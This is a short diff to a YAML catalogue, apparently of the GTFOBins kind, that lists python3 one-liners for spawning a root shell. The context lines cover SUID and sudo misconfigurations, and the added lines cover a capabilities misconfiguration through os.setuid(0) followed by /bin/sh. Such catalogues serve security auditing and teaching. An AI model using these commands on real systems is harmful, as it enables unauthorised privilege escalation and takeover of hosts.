@@ -34,4 +34,6 @@ functions:
     - code: ./python3 -c 'import os; os.system("/bin/sh -p")'
   sudo-enabled:
     - code: sudo python3 -c 'import os; os.system("/bin/sh")'
+  capabilities-enabled:
+    - code: ./python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
 ---
